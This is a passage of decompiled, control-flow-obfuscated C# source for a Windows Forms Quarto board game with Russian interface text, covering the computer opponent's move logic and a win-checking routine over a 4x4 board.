					num = num13 ^ (int)(num2 * 1813846465);
					continue;
				}
				case 13u:
					num = (int)(num2 * 1103877676) ^ -1933643646;
					continue;
				case 12u:
					num = (int)((num2 * 2091937120) ^ 0x7DD64958);
					continue;
				case 11u:
					num6 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -571218035) ^ 0x6C18224;
					continue;
				case 10u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num10]), num6 * size + 4, num5 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -450089436) ^ 0x6C97B5F9;
					continue;
				case 9u:
					flag = num10 < 4;
					num = 1816471911;
					continue;
				case 8u:
				{
					int num12;
					if (!(Form1.smethod_41((Control)(object)borderBox[num11, num10]) == Color.Blue))
					{
						num = 1016796024;
						num12 = 1016796024;
					}
					else
					{
						num = 1644990547;
						num12 = 1644990547;
					}
					continue;
				}
				case 7u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -2091995680;
						num9 = -2091995680;
					}
					else
					{
						num8 = -879785218;
						num9 = -879785218;
					}
					num = num8 ^ (int)(num2 * 1233868744);
					continue;
				}
				case 6u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 2718150) ^ -2014683531;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 848531212) ^ -1664120473;
					continue;
				case 4u:
					num5 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -391002036) ^ 0x675AD8BF;
					continue;
				case 3u:
					num = (int)(num2 * 2077560285) ^ -1067926441;
					continue;
				case 2u:
					num = ((int)num2 * -1913226507) ^ -1495968268;
					continue;
				case 1u:
					num7 = ((board[num5, num6] == null) ? 1 : 0);
					goto IL_0084;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 923675765;
						num4 = 923675765;
					}
					else
					{
						num3 = 1278323055;
						num4 = 1278323055;
					}
					num = num3 ^ (int)(num2 * 446644811);
					continue;
				}
				default:
					return;
				case 17u:
					break;
				case 19u:
					return;
					IL_0084:
					flag2 = (byte)num7 != 0;
					num = 279626876;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_13e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1412: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num15 = default(int);
		int num16 = default(int);
		int num14 = default(int);
		int num26 = default(int);
		Graphics graphics_ = default(Graphics);
		int num22 = default(int);
		int num21 = default(int);
		bool flag9 = default(bool);
		int num4 = default(int);
		int num5 = default(int);
		bool flag16 = default(bool);
		int num7 = default(int);
		int num30 = default(int);
		bool flag17 = default(bool);
		int num27 = default(int);
		bool flag = default(bool);
		int num19 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num34 = default(int);
		int num35 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		bool flag15 = default(bool);
		bool flag14 = default(bool);
		bool flag10 = default(bool);
		int num6 = default(int);
		bool flag3 = default(bool);
		int num13 = default(int);
		int num48 = default(int);
		bool flag12 = default(bool);
		int num23 = default(int);
		bool flag13 = default(bool);
		bool flag6 = default(bool);
		bool flag2 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag8 = default(bool);
		int num3 = default(int);
		bool flag7 = default(bool);
		bool flag11 = default(bool);
		bool flag4 = default(bool);
		bool flag5 = default(bool);
		while (true)
		{
			int num = -1919229415;
			while (true)
			{
				uint num2;
				int num12;
				int num60;
				int num38;
				int num33;
				switch ((num2 = (uint)num ^ 0xA4BAA808u) % 182u)
				{
				case 181u:
					num15 = Form1.smethod_33(rnd, 4);
					num16 = Form1.smethod_33(rnd, 4);
					if (storage[num15, num16] != null)
					{
						num = ((int)num2 * -520321450) ^ 0x63F764F0;
						continue;
					}
					goto IL_0054;
				case 180u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 697701521) ^ 0x8AA1A1);
					continue;
				case 179u:
					num = ((int)num2 * -1391796016) ^ -2089040684;
					continue;
				case 178u:
					num14++;
					num = -40694024;
					continue;
				case 177u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -844887666) ^ 0x5CAE65AD;
					continue;
				case 176u:
					num = (int)((num2 * 1044793787) ^ 0x501B6992);
					continue;
				case 175u:
					num26++;
					num = ((int)num2 * -1011462412) ^ 0x53467BFE;
					continue;
				case 174u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num22 + 0.05f) * (float)size, ((float)num21 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 901802009) ^ -846883639;
					continue;
				case 172u:
					num21 = 0;
					num = ((int)num2 * -1977582035) ^ -768034587;
					continue;
				case 171u:
					num = -1273934282;
					continue;
				case 170u:
				{
					int num39;
					int num40;
					if (flag9)
					{
						num39 = 662684783;
						num40 = 662684783;
					}
					else
					{
						num39 = 1692624857;
						num40 = 1692624857;
					}
					num = num39 ^ ((int)num2 * -2038586308);
					continue;
				}
				case 169u:
					num12 = ((!Standoff(board)) ? 1 : 0);
					goto IL_01cd;
				case 168u:
					num = (int)((num2 * 1961333527) ^ 0x6F40428C);
					continue;
				case 167u:
					Form1.smethod_30((Control)(object)borderBox[num4, num5]);
					num = ((int)num2 * -213750127) ^ 0x68D8C6F8;
					continue;
				case 166u:
				{
					int num64;
					int num65;
					if (!flag16)
					{
						num64 = 2035575795;
						num65 = 2035575795;
					}
					else
					{
						num64 = 1022384677;
						num65 = 1022384677;
					}
					num = num64 ^ (int)(num2 * 186978436);
					continue;
				}
				case 165u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 2059512091) ^ 0x28BB0C77);
					continue;
				case 164u:
					num7 = 0;
					num30 = 0;
					num = (int)(num2 * 1870382848) ^ -1539790303;
					continue;
				case 163u:
					num = (int)(num2 * 1050116174) ^ -599085119;
					continue;
				case 162u:
					flag17 = Form1.smethod_41((Control)(object)borderBox[num26, num27]) == Color.Red;
					num = ((int)num2 * -1834616961) ^ 0x3A0EF4A5;
					continue;
				case 161u:
					num = (int)((num2 * 374178048) ^ 0xA0A789C);
					continue;
				case 160u:
					flag = num19 < 4;
					num = -1243163650;
					continue;
				case 159u:
					array[num34, num35] = new Figurine(storage[num8, num9]);
					num = ((int)num2 * -607859295) ^ -491755351;
					continue;
				case 158u:
				{
					int num57;
					if (num22 >= 4)
					{
						num = -1512653825;
						num57 = -1512653825;
					}
					else
					{
						num = -581430683;
						num57 = -581430683;
					}
					continue;
				}
				case 157u:
					num = ((int)num2 * -2121559769) ^ 0x76017292;
					continue;
				case 156u:
					flag15 = Form1.smethod_41((Control)(object)borderBox[num4, num5]) == Color.Blue;
					num = ((int)num2 * -1695534648) ^ 0x3A40948D;
					continue;
				case 155u:
					num = ((int)num2 * -233003851) ^ 0x2FC000DB;
					continue;
				case 154u:
					board[num34, num35] = new Figurine(storage[num8, num9]);
					num = ((int)num2 * -1137191285) ^ -582862709;
					continue;
				case 153u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = ((int)num2 * -1925833626) ^ 0x515D8886;
					continue;
				case 152u:
					num = (int)(num2 * 1698105415) ^ -1143180052;
					continue;
				case 151u:
					Form1.smethod_20(pictureBox[num4, num5], (Image)null);
					num = ((int)num2 * -245326548) ^ 0x76E2E9A8;
					continue;
				case 150u:
					num = ((int)num2 * -803634264) ^ 0x22F4D33F;
					continue;
				case 149u:
					flag14 = Standoff(board);
					num = -802328266;
					continue;
				case 148u:
					num5 = 0;
					num = -373724133;
					continue;
				case 147u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 109677448) ^ -1423009885;
					continue;
				case 146u:
					if (num15 == num8)
					{
						num = ((int)num2 * -1695818590) ^ 0x1566B72D;
						continue;
					}
					goto IL_0060;
				case 145u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = (int)((num2 * 1977914022) ^ 0x11F7BEDC);
					continue;
				case 144u:
				{
					int num43;
					int num44;
					if (flag10)
					{
						num43 = -947736603;
						num44 = -947736603;
					}
					else
					{
						num43 = -1196422722;
						num44 = -1196422722;
					}
					num = num43 ^ (int)(num2 * 1645605810);
					continue;
				}
				case 143u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -151538871;
					continue;
				case 142u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1737536424) ^ -696296102;
					continue;
				case 141u:
				{
					int num36;
					int num37;
					if (board[num34, num35] != null)
					{
						num36 = 112570135;
						num37 = 112570135;
					}
					else
					{
						num36 = 1571544347;
						num37 = 1571544347;
					}
					num = num36 ^ ((int)num2 * -294752345);
					continue;
				}
				case 140u:
					num = ((int)num2 * -54411436) ^ -899012440;
					continue;
				case 139u:
					num = -1125725492;
					continue;
				case 138u:
					num = -1569639565;
					continue;
				case 137u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = (int)((num2 * 936989813) ^ 0x5AAB0F42);
					continue;
				case 136u:
					num5++;
					num = -584701020;
					continue;
				case 135u:
					num6 = 0;
					num = ((int)num2 * -1031283079) ^ 0x51482D3;
					continue;
				case 134u:
					flag3 = num4 < 4;
					num = -1706175456;
					continue;
				case 133u:
				{
					Figurine[,] array2 = (Figurine[,])Form1.smethod_48((Array)array);
					array2[num13, num14] = new Figurine(storage[num15, num16]);
					int num17;
					int num18;
					if (!Stop(array2))
					{
						num17 = 588695803;
						num18 = 588695803;
					}
					else
					{
						num17 = 782037196;
						num18 = 782037196;
					}
					num = num17 ^ ((int)num2 * -1413861692);
					continue;
				}
				case 132u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = (int)((num2 * 119248383) ^ 0x714A02BE);
					continue;
				case 131u:
					num = ((int)num2 * -1768486615) ^ -445226811;
					continue;
				case 130u:
					num = ((int)num2 * -872717288) ^ 0x61939AB7;
					continue;
				case 129u:
					num = -1701343865;
					continue;
				case 128u:
					board[num30, num48] = new Figurine(storage[num6, num7]);
					num = (int)(num2 * 833786807) ^ -690381206;
					continue;
				case 127u:
					num4++;
					num = ((int)num2 * -1649166379) ^ 0x6C5934D5;
					continue;
				case 126u:
				{
					int num66;
					int num67;
					if (!flag3)
					{
						num66 = 1346834378;
						num67 = 1346834378;
					}
					else
					{
						num66 = 1289474154;
						num67 = 1289474154;
					}
					num = num66 ^ (int)(num2 * 1515198198);
					continue;
				}
				case 124u:
					num = -1428630218;
					continue;
				case 123u:
					num = (int)((num2 * 1684801380) ^ 0x2FB161D7);
					continue;
				case 122u:
					Form1.smethod_5((Control)(object)borderBox[num26, num27], Color.LimeGreen);
					num = (int)((num2 * 1086094884) ^ 0x184F0F04);
					continue;
				case 121u:
					num = ((int)num2 * -637730219) ^ 0x50F888A1;
					continue;
				case 120u:
					num13 = 0;
					num = (int)(num2 * 1151047505) ^ -148137542;
					continue;
				case 119u:
				{
					int num62;
					int num63;
					if (flag12)
					{
						num62 = 442618570;
						num63 = 442618570;
					}
					else
					{
						num62 = 799048622;
						num63 = 799048622;
					}
					num = num62 ^ ((int)num2 * -257413496);
					continue;
				}
				case 118u:
					num = (int)((num2 * 529394730) ^ 0x48806471);
					continue;
				case 117u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -1310739689) ^ -352700761;
					continue;
				case 116u:
				{
					int num61;
					if (num26 < 4)
					{
						num = -1398320949;
						num61 = -1398320949;
					}
					else
					{
						num = -1254784401;
						num61 = -1254784401;
					}
					continue;
				}
				case 115u:
					if (num23 >= 9)
					{
						num = -1007792065;
						num60 = -1007792065;
						continue;
					}
					goto IL_0816;
				case 114u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = ((int)num2 * -1090761934) ^ 0x1151AA69;
					continue;
				case 113u:
					Paint_Board();
					if (!Stop(board))
					{
						num = (int)((num2 * 885477436) ^ 0x3A8CBDD1);
						continue;
					}
					num12 = 0;
					goto IL_01cd;
				case 112u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = ((int)num2 * -1526744877) ^ 0x7562511A;
					continue;
				case 111u:
					Form1.smethod_30((Control)(object)borderBox[num26, num27]);
					num = (int)((num2 * 861908644) ^ 0x2CEE9556);
					continue;
				case 110u:
					num = (int)((num2 * 263134771) ^ 0x305D013C);
					continue;
				case 109u:
					if (num16 == num9)
					{
						goto IL_0054;
					}
					goto IL_0060;
				case 108u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1208100681) ^ -924606730;
					continue;
				case 107u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num35 + 0.05f) * (float)size, ((float)num34 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 403639880) ^ -1960242474;
					continue;
				case 106u:
					num7 = num5;
					num = (int)(num2 * 965497608) ^ -2050655292;
					continue;
				case 105u:
					num22++;
					num = -1339233286;
					continue;
				case 104u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = -1273019366;
					continue;
				case 103u:
					num = ((int)num2 * -917007561) ^ -1445276630;
					continue;
				case 102u:
					num = -1404881275;
					continue;
				case 101u:
					num = ((int)num2 * -1487735503) ^ 0x6FB6C74D;
					continue;
				case 100u:
					flag13 = true;
					num = ((int)num2 * -1384440475) ^ -724804321;
					continue;
				case 99u:
				{
					int num58;
					int num59;
					if (flag17)
					{
						num58 = 1949400521;
						num59 = 1949400521;
					}
					else
					{
						num58 = 278693823;
						num59 = 278693823;
					}
					num = num58 ^ ((int)num2 * -990810044);
					continue;
				}
				case 98u:
					step++;
					num = (int)((num2 * 435544889) ^ 0x5D32602F);
					continue;
				case 97u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 712666194) ^ -2140811802;
					continue;
				case 96u:
					flag16 = num13 < 4;
					num = -1534613868;
					continue;
				case 95u:
				{
					int num55;
					int num56;
					if (flag6)
					{
						num55 = 1831867862;
						num56 = 1831867862;
					}
					else
					{
						num55 = 1329783440;
						num56 = 1329783440;
					}
					num = num55 ^ ((int)num2 * -647760893);
					continue;
				}
				case 94u:
					num = ((int)num2 * -1867449319) ^ -328264367;
					continue;
				case 93u:
				{
					int num53;
					int num54;
					if (flag15)
					{
						num53 = -609651653;
						num54 = -609651653;
					}
					else
					{
						num53 = -1258474330;
						num54 = -1258474330;
					}
					num = num53 ^ (int)(num2 * 2109336096);
					continue;
				}
				case 92u:
					num = (int)(num2 * 2040919163) ^ -265482758;
					continue;
				case 91u:
					num27 = 0;
					num = -798849719;
					continue;
				case 90u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1996508827;
					continue;
				case 89u:
					num = -1042214498;
					continue;
				case 88u:
				{
					int num51;
					int num52;
					if (!flag14)
					{
						num51 = -1462304859;
						num52 = -1462304859;
					}
					else
					{
						num51 = -1751157121;
						num52 = -1751157121;
					}
					num = num51 ^ ((int)num2 * -1835113965);
					continue;
				}
				case 87u:
				{
					int num49;
					int num50;
					if (flag2)
					{
						num49 = -341882140;
						num50 = -341882140;
					}
					else
					{
						num49 = -1706885585;
						num50 = -1706885585;
					}
					num = num49 ^ ((int)num2 * -838593520);
					continue;
				}
				case 86u:
					num48 = num5;
					num = ((int)num2 * -1301758312) ^ 0x2BFC81DE;
					continue;
				case 85u:
					num48 = 0;
					num4 = 0;
					num = ((int)num2 * -516632651) ^ 0x280BB5B3;
					continue;
				case 84u:
					num = -821821837;
					continue;
				case 83u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 233097615) ^ 0x39B82D3C);
					continue;
				case 82u:
					num = (int)(num2 * 399572195) ^ -1193412288;
					continue;
				case 81u:
					num = (int)(num2 * 372753003) ^ -396308389;
					continue;
				case 80u:
					num = (int)((num2 * 1304627966) ^ 0x5CDF90AC);
					continue;
				case 79u:
					flag13 = false;
					num = (int)(num2 * 806119208) ^ -1965870200;
					continue;
				case 78u:
					if (!flag13)
					{
						num = ((int)num2 * -119141431) ^ -286730617;
						continue;
					}
					goto IL_0816;
				case 77u:
					num = (int)(num2 * 1774779711) ^ -1184446440;
					continue;
				case 76u:
					num35 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -428434973) ^ 0x40C49B2B;
					continue;
				case 75u:
					num22 = 0;
					num = -1339233286;
					continue;
				case 74u:
					flag12 = num14 < 4;
					num = -1948879509;
					continue;
				case 73u:
					Form1.smethod_30((Control)(object)pictureBox[num4, num5]);
					num = (int)((num2 * 273886176) ^ 0x79DF3526);
					continue;
				case 72u:
					num38 = (Standoff(array3) ? 1 : 0);
					goto IL_0ce7;
				case 71u:
					board[num21, num22] = new Figurine(storage[num8, num9]);
					num = ((int)num2 * -1231070231) ^ 0x1BB4EF38;
					continue;
				case 70u:
					num = (int)(num2 * 550258666) ^ -375229568;
					continue;
				case 69u:
					storage[num8, num9] = null;
					flag9 = Standoff(board);
					num = (int)(num2 * 358407759) ^ -1018688995;
					continue;
				case 68u:
					num = -305503135;
					continue;
				case 67u:
					num = ((int)num2 * -1270273128) ^ -236390147;
					continue;
				case 66u:
					num8 = 0;
					num9 = 0;
					num26 = 0;
					num = ((int)num2 * -876567428) ^ 0x6D2717C3;
					continue;
				case 65u:
					num = (int)((num2 * 215267399) ^ 0x7741C2CE);
					continue;
				case 64u:
					num8 = num26;
					num = ((int)num2 * -1851659724) ^ -1705441444;
					continue;
				case 63u:
					flag8 = num21 < 4;
					num = -1439120962;
					continue;
				case 62u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -684245053) ^ 0x2E8CE924;
					continue;
				case 61u:
					num = ((int)num2 * -383433310) ^ 0x7FD59043;
					continue;
				case 60u:
					num = (int)(num2 * 1627733760) ^ -254146099;
					continue;
				case 59u:
					num3++;
					num = (int)((num2 * 1281287835) ^ 0x534635A4);
					continue;
				case 58u:
					num = ((int)num2 * -645760453) ^ 0x2DFE23B8;
					continue;
				case 57u:
					num23 = 0;
					num = ((int)num2 * -889449996) ^ 0x75A2550D;
					continue;
				case 56u:
					num6 = num4;
					num = (int)(num2 * 785381256) ^ -848185886;
					continue;
				case 55u:
					num = (int)((num2 * 1467711373) ^ 0x3FA72C1B);
					continue;
				case 54u:
					num = (int)(num2 * 557396113) ^ -622652909;
					continue;
				case 53u:
					num = ((int)num2 * -94040268) ^ -537826598;
					continue;
				case 52u:
					flag7 = array[num13, num14] == null;
					num = -1028825148;
					continue;
				case 51u:
					num = ((int)num2 * -1345657589) ^ 0x44AB404D;
					continue;
				case 50u:
					flag11 = num27 < 4;
					num = -182391246;
					continue;
				case 49u:
					num34 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -327914612) ^ 0xE139942;
					continue;
				case 48u:
				{
					int num46;
					int num47;
					if (!flag11)
					{
						num46 = 2132197143;
						num47 = 2132197143;
					}
					else
					{
						num46 = 1031638623;
						num47 = 1031638623;
					}
					num = num46 ^ ((int)num2 * -1722884893);
					continue;
				}
				case 47u:
				{
					int num45;
					if (board[num21, num22] != null)
					{
						num = -1569639565;
						num45 = -1569639565;
					}
					else
					{
						num = -2105283267;
						num45 = -2105283267;
					}
					continue;
				}
				case 46u:
				{
					int num41;
					int num42;
					if (flag4)
					{
						num41 = -1849109350;
						num42 = -1849109350;
					}
					else
					{
						num41 = -362087345;
						num42 = -362087345;
					}
					num = num41 ^ ((int)num2 * -1826142733);
					continue;
				}
				case 45u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1555733345) ^ 0x66AEE966;
					continue;
				case 44u:
					flag10 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)((num2 * 482489436) ^ 0x1E618A3E);
					continue;
				case 43u:
					num19 = 0;
					num = ((int)num2 * -2097173666) ^ -527687286;
					continue;
				case 42u:
					if (!Stop(array3))
					{
						num = ((int)num2 * -286281598) ^ -442590360;
						continue;
					}
					num38 = 1;
					goto IL_0ce7;
				case 41u:
					num = ((int)num2 * -1974907072) ^ -1804432316;
					continue;
				case 40u:
					num = ((int)num2 * -72548608) ^ -958333845;
					continue;
				case 39u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num35 * size + 4, num34 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)((num2 * 384693022) ^ 0x5022320D);
					continue;
				case 38u:
					num = ((int)num2 * -568362472) ^ 0x6D80C5F8;
					continue;
				case 37u:
					num = ((int)num2 * -1482694173) ^ -195543792;
					continue;
				case 36u:
				{
					int num31;
					int num32;
					if (flag8)
					{
						num31 = 2137731911;
						num32 = 2137731911;
					}
					else
					{
						num31 = 1916777883;
						num32 = 1916777883;
					}
					num = num31 ^ ((int)num2 * -675213173);
					continue;
				}
				case 35u:
					Form1.smethod_5((Control)(object)borderBox[num15, num16], Color.Blue);
					num = (int)((num2 * 1105279820) ^ 0x44A143BC);
					continue;
				case 34u:
					num30 = num4;
					num = (int)(num2 * 587452943) ^ -1110678514;
					continue;
				case 33u:
					num = (int)(num2 * 181957630) ^ -2043183593;
					continue;
				case 32u:
					Form1.smethod_30((Control)(object)borderBox[num15, num16]);
					num = ((int)num2 * -450366559) ^ -253416853;
					continue;
				case 31u:
					num = ((int)num2 * -1400260149) ^ 0x7BA8A267;
					continue;
				case 30u:
					num13++;
					num = (int)((num2 * 1218754079) ^ 0x61CD30AC);
					continue;
				case 29u:
					num = ((int)num2 * -1081074377) ^ -292087569;
					continue;
				case 28u:
					num9 = num27;
					num = (int)(num2 * 2060318518) ^ -1076975517;
					continue;
				case 27u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num22 * size + 4, num21 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 815921804) ^ -1167099482;
					continue;
				case 26u:
					num27++;
					num = ((int)num2 * -1347512015) ^ 0x334A5D02;
					continue;
				case 25u:
					Form1.smethod_7((Control)(object)pictureBox[num19, num3], bool_0: true);
					num = -396042893;
					continue;
				case 24u:
				{
					int num28;
					int num29;
					if (!flag7)
					{
						num28 = 1419662214;
						num29 = 1419662214;
					}
					else
					{
						num28 = 816754999;
						num29 = 816754999;
					}
					num = num28 ^ (int)(num2 * 64207332);
					continue;
				}
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox[num26, num27], bool_0: false);
					num = (int)(num2 * 386938214) ^ -1089121832;
					continue;
				case 22u:
					num = (int)(num2 * 232416566) ^ -455194742;
					continue;
				case 21u:
					flag6 = num3 < 4;
					num = -1000896295;
					continue;
				case 20u:
				{
					int num24;
					int num25;
					if (flag5)
					{
						num24 = 870639912;
						num25 = 870639912;
					}
					else
					{
						num24 = 497065548;
						num25 = 497065548;
					}
					num = num24 ^ (int)(num2 * 282319639);
					continue;
				}
				case 19u:
					num = (int)(num2 * 752710080) ^ -387024301;
					continue;
				case 18u:
					num23++;
					num = ((int)num2 * -515896413) ^ 0x3334E5E7;
					continue;
				case 17u:
					array3[num21, num22] = new Figurine(storage[num8, num9]);
					num = (int)((num2 * 390686722) ^ 0x359E377A);
					continue;
				case 16u:
					flag4 = num5 < 4;
					num = -46155408;
					continue;
				case 15u:
					num21++;
					num = (int)(num2 * 1406978319) ^ -2089135398;
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1896550544) ^ -1278026458;
					continue;
				case 13u:
					num = ((int)num2 * -1815653517) ^ 0x5295B67D;
					continue;
				case 12u:
				{
					int num20;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num5 * size + size / 2, (int)(((float)num4 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -1110917234;
						num20 = -1110917234;
					}
					else
					{
						num = -386331984;
						num20 = -386331984;
					}
					continue;
				}
				case 11u:
					num14 = 0;
					num = -1270468569;
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					num = ((int)num2 * -807282672) ^ 0x14A894C5;
					continue;
				case 9u:
					num19++;
					num = ((int)num2 * -203540664) ^ 0x48B25BC8;
					continue;
				case 8u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 1684846676;
						num11 = 1684846676;
					}
					else
					{
						num10 = 885773327;
						num11 = 885773327;
					}
					num = num10 ^ (int)(num2 * 1793022900);
					continue;
				}
				case 7u:
					storage[num8, num9] = null;
					num = ((int)num2 * -1958320288) ^ 0x5CA37E51;
					continue;
				case 6u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = ((int)num2 * -2022800948) ^ 0x254AEBDB;
					continue;
				case 5u:
					num = -635645621;
					continue;
				case 4u:
					storage[num6, num7] = null;
					num = ((int)num2 * -154540815) ^ -976700041;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 1765332887) ^ -1598402815;
					continue;
				case 2u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.White);
					num = (int)(num2 * 705669301) ^ -640633214;
					continue;
				case 1u:
					num3 = 0;
					num = -2071532953;
					continue;
				case 0u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 639350464) ^ -2080639659;
					continue;
				default:
					return;
				case 125u:
					break;
				case 173u:
					return;
					IL_01cd:
					flag2 = (byte)num12 != 0;
					num = -227166145;
					continue;
					IL_0054:
					num = -379398772;
					num33 = -379398772;
					continue;
					IL_0ce7:
					flag5 = (byte)num38 != 0;
					num = -2057901968;
					continue;
					IL_0060:
					num = -1753660022;
					num33 = -1753660022;
					continue;
					IL_0816:
					num = -523748359;
					num60 = -523748359;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -237796624;
			while (true)
			{
				uint num2;
				int num10;
				int num6;
				switch ((num2 = (uint)num ^ 0xBEB6C933u) % 77u)
				{
				case 76u:
				{
					int num57;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -1102775274;
						num57 = -1102775274;
					}
					else
					{
						num = -510572231;
						num57 = -510572231;
					}
					continue;
				}
				case 75u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1856040302;
						continue;
					}
					goto IL_0064;
				case 74u:
				{
					int num26;
					int num27;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num26 = 777511036;
						num27 = 777511036;
					}
					else
					{
						num26 = 705151733;
						num27 = 705151733;
					}
					num = num26 ^ (int)(num2 * 750690399);
					continue;
				}
				case 73u:
				{
					int num30;
					int num31;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num30 = -679287059;
						num31 = -679287059;
					}
					else
					{
						num30 = -849591139;
						num31 = -849591139;
					}
					num = num30 ^ ((int)num2 * -1972482365);
					continue;
				}
				case 72u:
				{
					int num37;
					int num38;
					if (mem[1, 1] == null)
					{
						num37 = -850176840;
						num38 = -850176840;
					}
					else
					{
						num37 = -181741816;
						num38 = -181741816;
					}
					num = num37 ^ ((int)num2 * -1032103901);
					continue;
				}
				case 71u:
				{
					int num54;
					int num55;
					if (mem[num3, 2] != null)
					{
						num54 = -757475683;
						num55 = -757475683;
					}
					else
					{
						num54 = -1657729653;
						num55 = -1657729653;
					}
					num = num54 ^ (int)(num2 * 1737359220);
					continue;
				}
				case 70u:
				{
					int num44;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -1309152435;
						num44 = -1309152435;
					}
					else
					{
						num = -30021421;
						num44 = -30021421;
					}
					continue;
				}
				case 69u:
				{
					int num15;
					int num16;
					if (!flag)
					{
						num15 = 1668761072;
						num16 = 1668761072;
					}
					else
					{
						num15 = 927722592;
						num16 = 927722592;
					}
					num = num15 ^ (int)(num2 * 1245285169);
					continue;
				}
				case 68u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)(num2 * 25619946) ^ -1528468714;
						continue;
					}
					goto IL_01e4;
				case 67u:
				{
					int num62;
					int num63;
					if (!flag3)
					{
						num62 = 1875169208;
						num63 = 1875169208;
					}
					else
					{
						num62 = 185921426;
						num63 = 185921426;
					}
					num = num62 ^ ((int)num2 * -1642349659);
					continue;
				}
				case 66u:
				{
					int num46;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -1265525308;
						num46 = -1265525308;
					}
					else
					{
						num = -1399875544;
						num46 = -1399875544;
					}
					continue;
				}
				case 65u:
				{
					int num24;
					int num25;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num24 = -1214737647;
						num25 = -1214737647;
					}
					else
					{
						num24 = -272579258;
						num25 = -272579258;
					}
					num = num24 ^ ((int)num2 * -272575864);
					continue;
				}
				case 64u:
				{
					int num9;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = -722011853;
						num9 = -722011853;
					}
					else
					{
						num = -485516788;
						num9 = -485516788;
					}
					continue;
				}
